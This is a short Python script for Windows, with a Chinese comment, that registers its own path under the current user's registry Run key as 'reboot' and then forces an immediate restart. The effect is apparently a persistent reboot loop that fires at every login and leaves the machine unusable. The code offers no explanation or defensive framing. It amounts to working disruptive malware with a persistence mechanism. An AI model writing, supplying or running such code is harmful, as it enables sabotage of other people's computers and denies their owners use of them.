import sys
import winreg as reg
import os


def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    path = os.path.join(file_path, sys.argv[0])

    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open_key, "reboot", 0, reg.REG_SZ, path)
    reg.CloseKey(open_key)


# 调用函数并传入你的 Python 脚本路径
add_to_startup(sys.argv[0])
print(sys.argv[0])
os.system("shutdown /r /t 0")
